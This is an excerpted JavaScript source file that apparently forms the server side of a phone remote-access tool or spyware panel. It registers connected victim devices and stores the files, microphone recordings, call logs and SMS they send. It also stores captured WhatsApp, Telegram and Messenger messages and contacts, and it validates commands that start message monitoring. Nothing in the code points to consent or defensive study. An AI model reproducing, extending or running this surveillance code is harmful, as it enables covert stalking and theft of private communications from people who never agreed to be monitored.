...
class Clients {
    ...
    clientConnect(socket, clientID, clientInfo) {
        let client = global.db.getMainDb().get('clients').find({ clientID });
        if (client.value() === undefined) {
            global.db.getMainDb().get('clients').push({
                clientID,
                isOnline: true,
                lastSeen: new Date(),
                firstSeen: new Date(),
            ...
            global.db.getMainDb().get('clients').find({ clientID }).assign({
                isOnline: true,
                lastSeen: new Date(),
                ...clientInfo
            }).write();
        ...
        this.clientConnections[clientID] = socket;
        // Setup listeners for this client
        this.setupListeners(clientID);
        logManager.log(CONST.logTypes.success, clientID + " Connected");
    }
    ...
    clientDisconnect(clientID) {
        ...
        logManager.log(CONST.logTypes.alert, clientID + " Disconnected");
    }

    getClientDatabase(clientID) {
        if (this.clientDatabases[clientID]) return this.clientDatabases[clientID];
        else {
            // Use getClientDb from DatabaseManager
            this.clientDatabases[clientID] = this.db.getClientDb(clientID);
    ...
    setupListeners(clientID) {
        ...
        if (!socket) {
            logManager.log(CONST.logTypes.error, "Cannot setup listeners: Socket not found for " + clientID);
            return;
        }
        
        let client = this.getClientDatabase(clientID);
        if (!client) {
            logManager.log(CONST.logTypes.error, "Cannot setup listeners: Database not found for " + clientID);
            return;
        }

        logManager.log(CONST.logTypes.info, clientID + " Setting up listeners");
        ...
        socket.on(CONST.messageKeys.files, (data) => {
            ...
            if (data.type === "list") {
                ...
                if (!fs.existsSync(CONST.downloadsFullPath)) {
                    fs.mkdirSync(CONST.downloadsFullPath, { recursive: true });
                }

                let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
                let fileKey = hash.substring(0, 5) + "-" + hash.substring(5, 9) + "-" + hash.substring(9, 14);
                let fileExt = (data.name && data.name.lastIndexOf(".") > 0) ? data.name.substring(data.name.lastIndexOf(".")) : '.unknown';
                ...
                fs.writeFile(filePath, data.buffer, (error) => {
                    if (!error) {
                        ...
                        logManager.log(CONST.logTypes.error, "Failed to save file from " + clientID);
                    }
                })
        ...
        socket.on(CONST.messageKeys.mic, (data) => {
            if (data.file) {
                logManager.log(CONST.logTypes.info, "Recieving " + (data.name || 'audio') + " from " + clientID);
                ...
                fs.writeFile(filePath, data.buffer, (e) => {
                    if (!e) {
                        client.get('downloads').push({
                            "time": new Date(),
                            "type": "voiceRecord",
                            "originalName": data.name || 'audio',
                            "path": CONST.downloadsFolder + '/' + fileKey + fileExt
                        }).write();
                        logManager.log(CONST.logTypes.success, "Voice record from " + clientID + " Saved");
                    } else {
                        console.error('Error saving voice record:', e);
                        logManager.log(CONST.logTypes.error, "Failed to save voice record from " + clientID);
                    }
                })
            }
        });
        ...
        socket.on(CONST.messageKeys.chatApps, (data) => {
            if (data.whatsapp) {
                client.get('whatsappMessages').push({
                    time: new Date(),
                    type: 'message',
                    data: data.whatsapp
                }).write();
                logManager.log(CONST.logTypes.success, clientID + " WhatsApp Message Captured");
            }
            
            if (data.telegram) {
                client.get('telegramMessages').push({
                    time: new Date(),
                    type: 'message',
                    data: data.telegram
                }).write();
                logManager.log(CONST.logTypes.success, clientID + " Telegram Message Captured");
            }
            
            if (data.messenger) {
                client.get('messengerMessages').push({
                    time: new Date(),
                    type: 'message',
                    data: data.messenger
                }).write();
                logManager.log(CONST.logTypes.success, clientID + " Messenger Message Captured");
            }
            
            if (data.chatContacts) {
                client.get('chatContacts').assign(data.chatContacts).write();
                logManager.log(CONST.logTypes.success, clientID + " Chat Contacts Updated");
            }
        });
    }
    ...
    // GET
    getClient(clientID) {
        let client = global.db.getMainDb().get('clients').find({ clientID }).value();
        if (client !== undefined) return client;
        else return false;
    }

    getClientList() {
        return global.db.getMainDb().get('clients').value();
    }

    getClientListOnline() {
        try {
            const clients = global.db.getMainDb().get('clients').value() || [];
    ...
    getClientListOffline() {
        try {
            ...
            console.error('Error getting offline clients:', error);
            return [];
        }
    }
        ...
        if (client !== undefined) {
            ...
            if (page === "calls") {
                ...
                if (filter && filter.length >= 6) {
                    let filterValue = filter.slice(-6);
                    let filterData = clientDB.get('CallData').sortBy('date').reverse().value().filter(calls => calls.phoneNo && calls.phoneNo.slice(-6) === filterValue);
                    if (filterData && filterData.length > 0) pageData = filterData;
                }
            }
            else if (page === "sms") {
                ...
                if (filter && filter.length >= 6) {
                    let filterValue = filter.slice(-6);
                    let filterData = clientDB.get('SMSData').value().filter(sms => sms.address && sms.address.slice(-6) === filterValue);
                    if (filterData && filterData.length > 0) pageData = filterData;
                }
            }
            ...
            else if (page === "whatsapp") pageData = clientDB.get('whatsappMessages').sortBy('time').reverse().value();
            else if (page === "telegram") pageData = clientDB.get('telegramMessages').sortBy('time').reverse().value();
            else if (page === "messenger") pageData = clientDB.get('messengerMessages').sortBy('time').reverse().value();
            else if (page === "chatcontacts") pageData = clientData.chatContacts;
    ...
    deleteClient(clientID) {
        global.db.getMainDb().get('clients').remove({ clientID }).write();
        if (this.clientConnections[clientID]) delete this.clientConnections[clientID];
    }
    ...
    checkCorrectParams(commandID, commandPayload, cb) {
        ...
        else if (commandID === CONST.messageKeys.chatApps) {
            if (!('action' in commandPayload)) return cb('ChatApps Missing `action` Parameter');
            else {
                if (commandPayload.action === 'monitor') return cb(false);
                else if (commandPayload.action === 'getMessages') {
                    if (!('app' in commandPayload)) return cb('ChatApps Missing `app` Parameter');
                    else return cb(false);
                }
                else return cb('ChatApps `action` parameter incorrect');
            }
        }
